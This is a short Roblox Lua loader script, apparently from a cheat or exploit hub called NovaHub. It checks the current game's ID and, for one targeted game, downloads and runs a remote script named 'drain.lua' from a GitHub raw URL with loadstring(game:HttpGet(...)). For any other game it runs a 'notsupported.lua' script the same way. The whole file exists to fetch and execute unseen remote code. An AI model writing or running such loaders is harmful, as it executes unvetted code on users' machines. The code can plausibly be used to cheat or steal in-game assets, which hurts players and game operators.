local GAME1 = 10267363348
local SCRIPT_URL = "https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/drain.lua"

if game.GameId == GAME1 then
   
    
    local success, result = pcall(function()
        return loadstring(game:HttpGet(SCRIPT_URL))()
    end)
  
else
     local success, result = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/notsupported.lua"))()
    end)
end
